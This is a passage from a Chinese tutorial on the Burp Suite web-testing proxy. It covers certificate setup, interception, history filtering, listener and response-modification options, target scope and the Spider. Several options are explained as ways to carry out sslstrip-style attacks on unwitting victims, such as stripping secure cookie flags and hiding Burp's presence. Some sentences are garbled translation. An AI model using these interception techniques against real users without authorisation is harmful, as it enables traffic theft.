class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.以管理员权限运行ie浏览器</span><br><span class=\"line\">2.像http那样配置好代理 </span><br><span class=\"line\">3.在地址栏访问https地址，单击继续 </span><br><span class=\"line\">4.点击错误证书在这个地址栏 </span><br><span class=\"line\">5.点击查看证书 </span><br><span class=\"line\">6.在证书路径选项卡点击PortSwigger CA,然后再点击查看证书 </span><br><span class=\"line\">7.在常规选项卡里点击安装证书 </span><br><span class=\"line\">8.在证书导入向导中，选择“将所有的证书放入下列存储区” </span><br><span class=\"line\">9.点击浏览 </span><br><span class=\"line\">10.以当前用户或者本机计算机都可以 </span><br><span class=\"line\">11.点击ok完成导入 </span><br><span class=\"line\">12.重启ie（不需要以管理员权限运行） 其它浏览器差不多具体请查看官网 </span><br></pre></td></tr></table></figure>\n\n<p><a href=\"http://portswigger.net/burp/Help/proxy_options_installingCAcert.html\">http://portswigger.net/burp/Help/proxy_options_installingCAcert.html</a></p>\n<h3 id=\"Intercept\"><a href=\"#Intercept\" class=\"headerlink\" title=\"Intercept\"></a>Intercept</h3><p>用于显示和修改HTTP请求和响应，通过你的浏览器和Web服务器之间。在BurpProxy的选项中，您可以配置拦截规则来确定请求是什么和响应被拦截(例如，范围内的项目，与特定文件扩展名，项目要求与参数，等)。 该面板还包含以下控制：</p>\n<h4 id=\"Forward\"><a href=\"#Forward\" class=\"headerlink\" title=\"Forward\"></a>Forward</h4><p>当你编辑信息之后，发送信息到服务器或浏览器</p>\n<h4 id=\"Drop\"><a href=\"#Drop\" class=\"headerlink\" title=\"Drop\"></a>Drop</h4><p>当你不想要发送这次信息可以点击drop放弃这个拦截信息</p>\n<h4 id=\"Interception-is-on-off\"><a href=\"#Interception-is-on-off\" class=\"headerlink\" title=\"Interception is on&#x2F;off\"></a>Interception is on&#x2F;off</h4><p>这个按钮用来切换和关闭所有拦截。如果按钮显示Interception is On，表示请求和响应将被拦截或自动转发根据配置的拦截规则配置代理选项。如果按钮显示Interception is off则显示拦截之后的所有信息将自动转发。</p>\n<h4 id=\"Action\"><a href=\"#Action\" class=\"headerlink\" title=\"Action\"></a>Action</h4><p>说明一个菜单可用的动作行为操作可以有哪些操作功能。</p>\n<h4 id=\"Comment-field\"><a href=\"#Comment-field\" class=\"headerlink\" title=\"Comment field\"></a>Comment field</h4><p>为请求或响应添加注释，以便更容易在History选项卡中识别它们。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120578170.png\" alt=\"Image011\" title=\"image011.png\"></p>\n<h4 id=\"Highlight\"><a href=\"#Highlight\" class=\"headerlink\" title=\"Highlight\"></a>Highlight</h4><p>为请求或响应添加颜色，可以在history选项卡和截获中更容易发现。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120669655.png\" alt=\"Image013\" title=\"image013.png\"></p>\n<h4 id=\"History\"><a href=\"#History\" class=\"headerlink\" title=\"History\"></a>History</h4><p>代理历史认为每个请求和响应。通过代理可以记录全部请求和响应。您可以过滤和注释这个信息来帮助管理它，并使用代理的历史来测试流程。History(代理历史)总在更新，即使你把Interception turned off(拦截关闭)，允许浏览不中断的同时还监测应用流量的关键细节。</p>\n<h4 id=\"History-Table\"><a href=\"#History-Table\" class=\"headerlink\" title=\"History Table\"></a>History Table</h4><p>表中显示已通过代理HTTP消息的所有请求，并且可以查看完整的你所做的任何修改和截获的信息的请求和响应。 表中包含以下字段：</p>\n<p><code># (请求索引号)、Host(主机)、Method(请求方式)、URL(请求地址)、Params(参数)、Edited(编辑)、Status(状态)、Length(响应字节长度)、MIME type(响应的MLME类型)、Extension(地址文件扩展名)、Title(页面标题)、Comment(注释)、SSL、IP(目标IP地址)、Cookies、Time(发出请求时间)、Listener port(监听端口)</code>。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120687800.png\" alt=\"Image015\" title=\"image015.png\"></p>\n<p>您可以通过单击任何列标题进行升序或降序排列。如果您在表中双击选择一个项目地址，会显示出一个详细的请求和响应的窗口。或者右击选择 <code>Show new history window</code></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120625578.png\" alt=\"Image017\" title=\"image017.png\"></p>\n<h3 id=\"Display-Filter\"><a href=\"#Display-Filter\" class=\"headerlink\" title=\"Display Filter\"></a>Display Filter</h3><p>Proxy histroy有一个可以用来在视图中隐藏某些内容的功能，以使其更易于分析和你感兴趣的工作内容的显示过滤。 History Table上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120694811.png\" alt=\"Image019\" title=\"image019.png\"></p>\n<h4 id=\"Request-type\"><a href=\"#Request-type\" class=\"headerlink\" title=\"Request type\"></a>Request type</h4><p>Show only in-scope items–勾选则显示在范围内的项目，反之。</p>\n<h4 id=\"MIME-type\"><a href=\"#MIME-type\" class=\"headerlink\" title=\"MIME type\"></a>MIME type</h4><p>您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。</p>\n<h4 id=\"Status-code\"><a href=\"#Status-code\" class=\"headerlink\" title=\"Status code\"></a>Status code</h4><p>您可以设定是否要显示或隐藏各种HTTP状态码响应。</p>\n<h4 id=\"Search-term\"><a href=\"#Search-term\" class=\"headerlink\" title=\"Search term\"></a>Search term</h4><p>您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“Negative search (消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。</p>\n<h4 id=\"File-extension\"><a href=\"#File-extension\" class=\"headerlink\" title=\"File extension\"></a>File extension</h4><p>您可以设定是否要显示或隐藏指定的文件扩展名的项目。</p>\n<h4 id=\"Annotation\"><a href=\"#Annotation\" class=\"headerlink\" title=\"Annotation\"></a>Annotation</h4><p>您可以设定是否显示使用用户提供的评论或仅亮点项目。</p>\n<h4 id=\"Listener\"><a href=\"#Listener\" class=\"headerlink\" title=\"Listener\"></a>Listener</h4><p>你可以只显示特定的监听端口上接收的项目。测试访问控制时可能有用。 如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究了大量代理的历史来理解各种不同的请求显示。</p>\n<h3 id=\"Annotations\"><a href=\"#Annotations\" class=\"headerlink\" title=\"Annotations\"></a>Annotations</h3><p>您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。 两种方式添加亮点： 1)使用在最左边的表列中的下拉菜单中突出显示单个项目。 2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。 两种方法添加注释： 1)双击相关条目，注释列中，添加或编辑就地评论。 2)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。 除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。</p>\n<h3 id=\"Options\"><a href=\"#Options\" class=\"headerlink\" title=\"Options\"></a>Options</h3><p>设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等。</p>\n<h3 id=\"Proxy-Listeners\"><a href=\"#Proxy-Listeners\" class=\"headerlink\" title=\"Proxy Listeners\"></a>Proxy Listeners</h3><p>代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听12.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120626419.png\" alt=\"Image021\" title=\"image021.png\"></p>\n<h4 id=\"1-Binding\"><a href=\"#1-Binding\" class=\"headerlink\" title=\"1)Binding\"></a>1)Binding</h4><p>这些设置控制Burp怎么代理监听器绑定到本地网络接口：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Bind to port---这是将被打开侦听传入连接的本地接口上的端口。你将需要使用一个没有被绑定被其他应用程序的闲置端口。</span><br><span class=\"line\">Bind to address---这是Burp绑定到本地接口的IP地址。</span><br></pre></td></tr></table></figure>\n\n<p>您可以绑定到刚刚127.0.0.1接口或所有接口，或任何特定的本地IP地址。</p>\n<p>注意：如果监听器绑定到所有接口或特定的非loopback接口，那么其他计算机可能无法连接到该侦听器。这可能使他们发起出站连接，从您的IP地址发起，并以访问代理服务器历史的内容，其中可能包含敏感数据，如登录凭据。你应该只启用此当你位于一个受信任的网络上。</p>\n<p>BurpSuite让您创建多个代理服务器的侦听器，并提供了丰富的控制自己的行为的配置选项。你可能偶尔需要进行测试时不寻常的应用，或与一些非基于浏览器的HTTP客户端进行合作，利用这些选项。</p>\n<h4 id=\"2-Request-Handling\"><a href=\"#2-Request-Handling\" class=\"headerlink\" title=\"2)Request Handling\"></a>2)Request Handling</h4><p>这些设置包括选项来控制是否BurpSuite重定向通过此侦听器接收到的请求：</p>\n<p><strong>Redirect to host</strong> - 如果配置了这个选项，Burp会在每次请求转发到指定的主机，而不必受限于浏览器所请求的目标。需要注意的是，如果你正使用该选项，则可能需要配置匹配&#x2F;替换规则重写的主机头中的请求，如果服务器中，您重定向请求预期，不同于由浏览器发送一个主机头。</p>\n<p><strong>Redirect to port</strong> - 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览器所请求的目标。</p>\n<p><strong>Force use of SSL</strong> - 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。</p>\n<p>注意：每一个重定向选项都可以单独使用。因此，例如，可以将所有请求重定向到一个特定的主机，同时保留原来的端口和协议在每个原始请求中使用。隐形BurpProxy的支持允许非代理感知客户端直接连接到监听。</p>\n<h4 id=\"3-Certificate\"><a href=\"#3-Certificate\" class=\"headerlink\" title=\"3)Certificate\"></a>3)Certificate</h4><p>这些设置控制呈现给客户端的SSL服务器的SSL证书。使用这些选项可以解决一些使用拦截代理时出现的SSL问题：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你可以消除您的浏览器的SSL警报，并需要建立SSL例外。 </span><br><span class=\"line\">凡网页加载来自其他域的SSL保护的项目，您可以确保这些均可由浏览器加载，而不需要先手动接受每个引用的域代理的SSL证书。 </span><br><span class=\"line\">您可以与拒绝连接到服务器，如果接收到无效的SSL证书胖客户端应用程序的工作。 </span><br></pre></td></tr></table></figure>\n\n<p>下列选项可用：</p>\n<p><strong>Use a self-signed certificate</strong>—||-一个简单的自签名SSL证书提交给您的浏览器，它总是导致SSL警告。</p>\n<p><strong>Generate CA-signed per-host certificate</strong>—||-这是默认选项。安装后，BurpSuite创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用，每次BurpSuite运行。当你的浏览器发出SSL连接到指定的主机，Burp产生该主机，通过CA证书签名的SSL证书。您可以安装BurpSuite的CA证书作为在浏览器中受信任的根，从而使每个主机的证书被接受，没有任何警报。您还可以导出其他工具或Burp的其他实例使用CA证书。</p>\n<p><strong>Generate a CA-signed certificate with a specific hostname</strong>—||这类似于前面的选项;然而，Burp会产生一个单一的主机证书与每一个SSL连接使用，使用您指定的主机名。在进行无形的代理时，此选项有时是必要的，因为客户端没有发送连接请求，因此Burp不能确定SSL协议所需的主机名。你也可以安装BurpSuite的CA证书作为受信任的根。</p>\n<p><strong>Use a custom certificate</strong>—||-此选项使您可以加载一个特定的证书（在PKCS＃12格式）呈现给你的浏览器。如果应用程序使用它需要特定的服务器证书（例如一个给定序列号或证书链）的客户端应该使用这个选项。</p>\n<h4 id=\"4-Exporting-and-Importing-the-CA-Certificate\"><a href=\"#4-Exporting-and-Importing-the-CA-Certificate\" class=\"headerlink\" title=\"4)Exporting and Importing the CA Certificate\"></a>4)Exporting and Importing the CA Certificate</h4><p>您可以导出您安装特定的CA证书在其他工具或BurpSuite的其他情况下使用，并且可以导入证书Burp在当前实例使用。 您可以选择要导出的证书只（用于导入到您的浏览器或其他设备的信任），或者你可以同时导出的证书及其私钥。</p>\n<p>注意：您不应该透露的私钥证书给任何不可信的一方。拥有你的证书和密钥的恶意攻击者可能可以，即使你不使用Burp拦截浏览器的HTTPS流量。</p>\n<p>您也可以仅通过访问http:&#x2F;&#x2F;burp&#x2F;cert在浏览器中导出证书。它使HTTPS请求您的浏览器相同的证书，但在一些移动设备上安装时，设备通过一个URL来下载它是有帮助的。</p>\n<h3 id=\"Interception-Options\"><a href=\"#Interception-Options\" class=\"headerlink\" title=\"Interception Options\"></a>Interception Options</h3><p>设置控制哪些请求和响应都停滞用于查看和编辑在拦截选项卡。单独的设置将应用到请求和响应。</p>\n<p>在“Intercept”复选框确定是否有讯息拦截。如果它被选中，然后Burp应用配置的规则对每个消息，以确定它是否应该被拦截。</p>\n<p>个别规则可以激活或停用对每个规则的左边的复选框。规则可以被添加，编辑，删除，或使用按钮重新排序。规则可以在消息，包括域名， IP地址，协议， HTTP方法， URL，文件扩展名，参数，cookie ，头&#x2F;主体内容，状态代码，MIME类型， HTML页面标题和代理的几乎任何属性进行配置侦听端口。您可以配置规则来只拦截项目的网址是目标范围之内的。可以使用正则表达式对定义复杂的匹配条件。</p>\n<p>规则按顺序处理，并且使用布尔运算符AND和OR组合。这些都与处理简单的“从左到右”的逻辑，其中每个算子的范围，如下所示：（所有规则之前累积的结果）和&#x2F;或（当前规则的结果）所有活动的规则在每封邮件进行处理，并最终活动规则应用后的结果确定消息是否被拦截或转发的背景。“自动更新内容长度”复选框控件时，这已被用户修改是否Burp自动更新消息的Content-Length头。使用这个选项通常是必不可少的，当HTTP主体已被修改。</p>\n<p>如果有需求，可以在请求结束时自动修复丢失或多余的新行。如果编辑请求不包含标题下面一个空行，Burp会添加此。如果与含有URL编码参数的身体的编辑请求包含任何换行符在身体的末端，Burp就会删除这些。这个选项可以是有用的纠正，而手动编辑在拦截视图的要求，以避免发出无效的请求向服务器发出的错误。</p>\n<h3 id=\"Response-Modification\"><a href=\"#Response-Modification\" class=\"headerlink\" title=\"Response Modification\"></a>Response Modification</h3><p>设置用于执行自动响应的修改。您可以使用这些选项通过自动重写应用程序响应的HTML来完成各种任务。 下列选项在数据删除客户端控件可能是有用的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">显示隐藏的表单字段。 （有一个子选项，以突出强调取消隐藏栏在屏幕上，便于识别。 ）</span><br><span class=\"line\">启用已禁用的表单域</span><br><span class=\"line\">删除输入字段长度限制</span><br><span class=\"line\">删除的JavaScript表单验证</span><br></pre></td></tr></table></figure>\n\n<p>下列选项可用于禁止客户端逻辑用于测试目的（注意，这些特征并非设计用来作为NoScript的的方式进行安全防御）有用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">删除所有的JavaScript。</span><br><span class=\"line\">删除&lt;object&gt;标记。</span><br></pre></td></tr></table></figure>\n\n<p>下列选项可用于提供对受害用户的流量在不知不觉中被通过BurpSuite代理sslstrip般的攻击。您可以在与听者选项强制SSL的传出请求，以有效地从用户的连接剥离SSL一起使用这些：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">转换HTTPS为HTTP的链接。</span><br><span class=\"line\">删除cookie安全标志。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Match-and-Replace\"><a href=\"#Match-and-Replace\" class=\"headerlink\" title=\"Match and Replace\"></a>Match and Replace</h3><p>用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，以及任何适用的替代品制成。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则 - 这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域。</p>\n<p>在替换字符串，组可以使用其次为索引$引用。所以下面的替换字符串将包含被匹配在上述正则表达式，该标记的名称：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120634416.png\" alt=\"Image023\" title=\"image023.png\"></p>\n<h3 id=\"SSL-Pass-Through\"><a href=\"#SSL-Pass-Through\" class=\"headerlink\" title=\"SSL Pass Through\"></a>SSL Pass Through</h3><p>用于指定目标Web服务器为其Burp会直接通过SSL连接。关于通过这些连接的请求或响应任何细节将在代理拦截视图或历史。</p>\n<p>通过SSL连接传递可以在这情况下是不能直接消除了客户端的SSL错误是非常有用 - 例如，在执行SSL证书钉扎的移动应用程序。如果应用程序访问多个域，或使用HTTP和HTTPS连接的混合，然后通过SSL连接到特定问题的主机仍然可以让您以正常方式使用Burp其他交通工作。</p>\n<p>如果启用该选项来自动添加客户端SSL协商失败的项目，然后BurpSuite会在客户端失败的SSL协议检测（例如，由于不承认BurpSuite的CA证书），并会自动将相关的服务器添加到SSL通通过列表。</p>\n<h3 id=\"Miscellaneous\"><a href=\"#Miscellaneous\" class=\"headerlink\" title=\"Miscellaneous\"></a>Miscellaneous</h3><p>控制Burp代理的行为的一些具体细节。下列选项可用：</p>\n<p><strong>Use HTTP&#x2F;1.0 in requests to server</strong> - 该选项控制BurpSuite代理是否强制在请求目标服务器的HTTP 1.0版。默认设置是使用任何的HTTP版本所使用的浏览器。然而，一些遗留服务器或应用程序可能需要1.0版本才能正常工作。</p>\n<p><strong>Use HTTP&#x2F;1.0 in responses to client</strong> - 目前所有的浏览器都支持这两个版本1.0和HTTP 1.1 。从1.0版本开始已经减少了一些功能，迫使使用1.0版本有时会很有用，以控制浏览器的行为的各个方面，例如防止企图执行HTTP流水线。</p>\n<p><strong>Set response header “Connection:close”</strong> - 这个选项也可能是有用的，以防止HTTP流水线在某些情况下。</p>\n<p><strong>Unpack gzip &#x2F; deflate in requests</strong> - 某些应用程序（通常是那些使用自定义客户端组件） ，压缩在请求消息体。该选项控制BurpProxy是否自动解压缩压缩请求主体。请注意，某些应用程序可能被破坏，如果他们期望的压缩体和压缩已通过Burp被删除。</p>\n<p><strong>Unpack gzip &#x2F; deflate in responses</strong> - 大多数浏览器接受的gzip和响应紧缩压缩的内容。该选项控制BurpSuite代理是否自动解压缩压缩响应机构。请注意，您可以经常防止服务器试图通过删除请求（可能使用BurpProxy的匹配和替换功能）的Accept-Encoding头压缩的响应。 Disable web interface at http:&#x2F;&#x2F;burp - 如果你不得不配置你的听众接受无保护的接口上的连接，并希望阻止他人接触到Burp浏览器控件，此选项可能有用。</p>\n<p><strong>Suppress Burp error messages</strong> - 当某些错误时，默认情况下BurpSuite返回有意义的错误信息到浏览器。如果你想在隐身模式下运行Burp，履行人在这方面的中间人攻击的受害者用户，那么它可能是有用的抑制这些错误信息来掩盖一个事实，即Burp是参与。</p>\n<p><strong>Disable logging to history and site map</strong> - 此选项可以防止Burp从记录任何请求到代理服务器的历史或目标站点地图。如果您使用的是Burp代理对于一些特定用途，如身份验证到上游服务器或进行匹配和替换操作，并且要避免产生内存和存储开销采伐牵扯它可能是有用的。</p>\n<p><strong>Enable interception at startup</strong>- 此选项可让您设定是否在Burp时启动代理截获应该启用。您可以选择始终启用拦截，始终禁用拦截，或者从Burp上次关闭恢复设置。</p>\n<h2 id=\"Target功能\"><a href=\"#Target功能\" class=\"headerlink\" title=\"Target功能\"></a>Target功能</h2><p>目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程。</p>\n<h3 id=\"Using-Burp-Target\"><a href=\"#Using-Burp-Target\" class=\"headerlink\" title=\"Using Burp Target\"></a>Using Burp Target</h3><p>在地址栏输入www.baidu.com，如图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120617724.jpg\" alt=\"Image025\" title=\"image025.jpg\"></p>\n<p>这样看起来site map是不是很乱，则可以右击add to scope，然后点击Filter勾选Show only in-scope items，此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤</p>\n<p><img src=\"/../images_result/images/2014101711120751588.jpg\" alt=\"Image027\" title=\"image027.jpg\"></p>\n<p>针对地址右击显示当前可以做的一些动作操作等功能。左图 针对文件右击显示当前可以做一些动作操作等功能。右图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120751588.jpg\" alt=\"Image029\" title=\"image029.jpg\"> <img src=\"https://wooyun.js.org/images_result/images/2014071402582281360.jpg\" alt=\"Image031\" title=\"image031.jpg\"></p>\n<h3 id=\"2-Scope\"><a href=\"#2-Scope\" class=\"headerlink\" title=\"2)Scope\"></a>2)Scope</h3><p>这个主要是配合Site map做一些过滤的功能，如图：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120768777.png\" alt=\"Image033\" title=\"image033.png\"></p>\n<p>Include in scope就是扫描地址或者拦截历史记录里右击有个add to scope就是添加到这了，也可以自己手动添加。</p>\n<p>Target分为site map和scope两个选项卡</p>\n<h4 id=\"SiteMap\"><a href=\"#SiteMap\" class=\"headerlink\" title=\"SiteMap\"></a>SiteMap</h4><p>中心Site Map汇总所有的信息Burp已经收集到的有关地址。你可以过滤并标注此信息，以帮助管理它，也可以使用SiteMap来手动测试工作流程。</p>\n<h4 id=\"Target-Information\"><a href=\"#Target-Information\" class=\"headerlink\" title=\"Target Information\"></a>Target Information</h4><p>SiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请求的URL 。您还可以扩大有趣的分支才能看到进一步的细节。如果您选择树的一个或多个部分，在所有子分支所选择的项目和项目都显示在表视图。</p>\n<p>该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 。如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求&#x2F;响应窗格。这包含了请求和响应的HTTP报文的编辑器，提供每封邮件的详细分析。</p>\n<p>站点地图汇总所有的信息BurpSuite已经收集到的有关申请。这包括：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">所有这一切都通过代理服务器直接请求的资源。</span><br><span class=\"line\">已推断出通过分析响应代理请求的任何物品（前提是你没有禁用被动Spider） 。</span><br><span class=\"line\">内容使用Spider或内容发现功能查找。</span><br><span class=\"line\">由用户手动添加的任何项目，从其它工具的输出。</span><br></pre></td></tr></table></figure>\n\n<p>已请求在SiteMap中的项目会显示为黑色。尚未被请求的项目显示为灰色。默认情况下（与被动蜘蛛(passviely scan this host)启用） ，当你开始浏览一个典型的应用，大量的内容将显示为灰色之前，你甚至得到尽可能要求，因为BurpSuite发现在您所请求的内容链接到它。您可以删除不感兴趣的地址</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120832954.png\" alt=\"Image035\" title=\"image035.png\"></p>\n<h4 id=\"Display-Filter-1\"><a href=\"#Display-Filter-1\" class=\"headerlink\" title=\"Display Filter\"></a>Display Filter</h4><p>Sitemap可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容的显示过滤器 Sitemap上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p>\n<p>Request type 你可以只显示在范围内的项目，只能与反应项目，或者带参数的请求。 MIME type 您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。 Status code 您可以设定是否要显示或隐藏各种HTTP状态码响应。 Search term 您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“消极搜索”选项，然后不匹配的搜索词唯一的项目将被显示。 File extension 您可以设定是否要显示或隐藏指定的文件扩展名的项目。 Annotation 您可以设定是否显示使用用户提供的评论或仅亮点项目。</p>\n<h4 id=\"Annotations-1\"><a href=\"#Annotations-1\" class=\"headerlink\" title=\"Annotations\"></a>Annotations</h4><p>通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。</p>\n<p>您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。</p>\n<p>两种方式添加亮点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)使用在最左边的表列中的下拉菜单中突出显示单个项目。</span><br><span class=\"line\">2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。</span><br><span class=\"line\">两种方法添加注释：</span><br><span class=\"line\">3)双击相关条目，注释列中，添加或编辑就地评论。</span><br><span class=\"line\">4)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。</span><br></pre></td></tr></table></figure>\n\n<p>除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。</p>\n<h4 id=\"Scope\"><a href=\"#Scope\" class=\"headerlink\" title=\"Scope\"></a>Scope</h4><p>Target scope设置，可以从SiteMap中添加也可以手动添加扫描范围到Scope。你可以在Target SiteMap和Proxy history上设置只显示在范围内的项目。并且可以设置代理拦截只有在范围内的请求和响应。Spider会扫描在范围内的地址。专业版还可以设置自动启动在范围内项目的漏洞扫描。您可以配置Intruder和Repeater跟随重定向到任何在范围内的网址。发送Burp目标以适当的方式执行行动，只针对你感兴趣并愿意攻击项目。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120869997.png\" alt=\"Image037\" title=\"image037.png\"></p>\n<p>范围定义使用的URL匹配规则两个表 - 一个“包括(include)”列表和“exclude(排除)”列表中。Burp根据一个URL地址来决定，如果它是目标范围之内，这将被视为是在范围上如果URL匹配至少一个“include”在内的规则，不符合“exclude”规则。这样能够定义特定的主机和目录为大致范围内，且距离该范围特定的子目录或文件（如注销或行政职能）排除。</p>\n<h2 id=\"Spider功能\"><a href=\"#Spider功能\" class=\"headerlink\" title=\"Spider功能\"></a>Spider功能</h2><p>Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。 通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。 结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序 视图。能使你清楚地了解到一个 web 应用程序是怎样工作的，让你避免进行大量 的手动任务而浪费时间，在跟踪链接，提交表单，精简 HTNL 源代码。可以快速地确人应 用程序的潜在的脆弱功能，还允许你指定特定的漏洞，如 SQL 注入，路径遍历。</p>\n<h3 id=\"Using-Burp-Spider\"><a href=\"#Using-Burp-Spider\" class=\"headerlink\" title=\"Using Burp Spider\"></a>Using Burp Spider</h3><p>要对应用程序使用 Burp Spider 需要两个简单的步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 使用 Burp Proxy 配置为你浏览器的代理服务器，浏览目标应用程序(为了节省时间，你可 以关闭代理拦截)。 </span><br><span class=\"line\">2 到站点地图的”target”选项上，选中目标应用程序驻留的主机和目录。选择上下文菜单的” spider this host/branch”选项。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711120832553.png\" alt=\"Image039\" title=\"image039.png\"></p>\n<p>你也可以在任何 Burp 工具的任意请求或响应上使用上下文菜单上选择” spider this item”。当你发送一个站点地图的分支来 spidering，Spider 会首先检查这个分支是否在定义好的spidering 的范围内。如果不是，Burp 会提示你是否把相关的 URL 添加到范围里。然后，Burp 开始 spidering，并执行下面的操作：</p>\n<p>在分支上，请求那些已被发现的还没被请求过的 URL。 在分支上，提交那些已被发现但提交 URL 错误的表单。 重复请求分支上的先前收到的状态码为 304 的项，为检索到一个应用程序的新(未进入缓存)副本。 对所有的检索到内容进行解析以确认新的 URL 和表单。 只有发现新内容就递归地重复这些步骤。 继续在所有的范围区域内 spidering，直到没有新内容为止。</p>\n<p>注意 Spider 会跟踪任何在当前定义的 spidering 范围内的 URL 链接。如果你定义了一个 范围比较大的目标，并且你只选择了其中的一个分支来 spidering，这时 Spider 会跟踪所有进入到这个比较大的范围内的链接，于是也就不在原来的分支上 spider。为了确保 Spider 只在指定分支内的请求上，你应该在开始时，就把 spidering 